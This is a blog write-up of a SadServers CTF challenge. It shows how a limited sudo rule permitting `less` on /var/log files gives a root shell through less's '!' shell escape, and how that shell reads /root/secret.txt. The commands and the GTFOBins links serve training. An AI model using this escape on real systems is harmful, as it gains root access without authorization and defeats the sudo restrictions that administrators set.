---
title: La Rinconada - Advent of Sysadmin 2025 - 12/05
tags: [devops, ctf]
date: 2025-12-05
---

> This is part of Sad Servers' [Advent of Sysadmin 2025](https://sadservers.com/advent) series.
>
> I'm doing each challenge every day and I'm publishing a quick write up for each one every day.
>
> 12-05: Restricted shell
>
> Spoiler alert! This gives the solution to the challenge.
> If you want to do it on your own, stop reading.

---

**Scenario:** "La Rinconada": Elevating privileges

**Level:** Medium

**Type:** Hack

**Tags:** [hack](https://sadservers.com/tag/hack)   [advent2025](https://sadservers.com/tag/advent2025)

**Access:** Email

**Description:** You are logged in as the user "admin" without general "sudo" privileges.  
The system administrator has granted you limited "sudo" access; this was intended to allow you to read log files.

Your mission is to find a way to exploit this limited sudo permission to gain a full root shell and read the secret file at _/root/secret.txt_  
Copy the content of _/root/secret.txt_ into the _/home/admin/solution.txt_ file, for example: cat /root/secret.txt > /home/admin/solution.txt (the "admin" user must be able to read the file).

**Root (sudo) Access:** False

**Test:** As the user "admin", md5sum /home/admin/solution.txt returns 52a55258e4d530489ffe0cc4cf02030c (we also accept the hash of the same secret string without an ending newline).

The "Check My Solution" button runs the script _/home/admin/agent/check.sh_, which you can see and execute.

**Time to Solve:** 15 minutes.

---

Cool little challenge to learn how to break out of a restricted shell when you have limited sudo access.

Start by listing what sudo access our user has:

```bash
admin@i-0adfc7a1f5cd64cfb:~$ whoami
admin

admin@i-0adfc7a1f5cd64cfb:~$ sudo -l
Matching Defaults entries for admin on i-0adfc7a1f5cd64cfb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User admin may run the following commands on i-0adfc7a1f5cd64cfb:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/less /var/log/*

```

The challenge description hinted at the fact that we could read some logs. As shown by the `sudo -l` command, we can use `less` to open files in `/var/log/*` as root without any password.

`less` is a pager that displays file content in a terminal window. Its commands are based on vi and vim. But this is where it gets interesting: while reading a file in `less`, you can invoke shell commands just like you would in vi. `less` spawns a shell to run whatever command you pass in. Since we're running `less` as root via sudo, any spawned shell inherits those root privileges.

> [less(1) - Linux manual page](https://man7.org/linux/man-pages/man1/less.1.html)

That means we can get a root shell from within `less`.

```bash
sudo less /var/log/dpkg.log # file will open in less, showing first lines

!whoami # type this once you're in less

root

!done (press RETURN) # pressing return to go back to less

!/bin/bash # type this to get an interactive shell as root

```

We can actually run the command from the challenge description directly from `less`. No need to enter a sub-shell:

```bash
sudo less /var/log/dpkg.log

!cat /root/secret.txt > /home/admin/solution.txt

```

And that's it. We escaped the limited shell and got the secret. 🚩

Here's some great resources about escaping restricted shells:

- [Restricted Shells Escaping Techniques](https://blog.certcube.com/restricted-shells-escaping-techniques/)
- [Restricted Shells Escaping Techniques - 2](https://blog.certcube.com/restricted-shells-escaping-techniques-2/)
- [How to Escape from Restricted Shells \| 0xffsec Handbook](https://0xffsec.com/handbook/shells/restricted-shells/)
- [less \| GTFOBins](https://gtfobins.github.io/gtfobins/less/)
